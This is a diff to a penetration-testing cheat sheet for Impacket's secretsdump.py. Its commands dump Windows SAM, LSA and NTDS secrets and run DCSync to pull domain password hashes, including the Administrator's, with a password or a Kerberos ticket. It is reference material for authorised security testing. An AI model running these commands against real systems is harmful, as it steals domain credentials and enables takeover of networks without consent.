@@ -3,16 +3,19 @@ Impacket tool for dumping secrets from Windows hosts (SAM, LSA, NTDS).
 
 ```bash
 # Local SAM + LSA + cached creds over SMB (admin creds required)
-secretsdump.py 'DOMAIN/user:pass@host'
+secretsdump.py 'DOMAIN/user:pass@host' [-use-ntds]
 
 # DCSync — dump everything from NTDS via DRSUAPI (needs replication rights)
-secretsdump.py -just-dc 'DOMAIN/user:pass@dc'
+secretsdump.py -just-dc 'DOMAIN/user:pass@dc' [-use-vss] [-use-ntds]
 
 # DCSync — NT hashes only (faster, quieter)
-secretsdump.py -just-dc-ntlm 'DOMAIN/user:pass@dc'
+secretsdump.py -just-dc-ntlm 'DOMAIN/user:pass@dc' [-use-vss] [-use-ntds]
 
 # DCSync — single user (bypasses SPN validation policy)
-secretsdump.py -just-dc-user Administrator 'DOMAIN/user:pass@dc'
+secretsdump.py -just-dc-user Administrator 'DOMAIN/user:pass@dc' [-use-vss] [-use-ntds]
+
+# History - previous passwords
+-history
 
 # With a Kerberos ticket instead of password
 KRB5CCNAME=ticket.ccache secretsdump.py -k -no-pass dc.domain.tld
@@ -86,7 +89,7 @@ Add `-use-ntds` to any DCSync invocation:
 ```bash
 KRB5CCNAME=admin@cifs_dc.domain.tld@DOMAIN.TLD.ccache \
   secretsdump.py -k -no-pass dc.domain.tld \
-  -just-dc-user Administrator --use-ntds
+  -just-dc-user Administrator -use-ntds
 ```
 
 > On Exegol → always add `-use-ntds` for DCSync (`-just-dc`, `-just-dc-ntlm`, `-just-dc-user`).
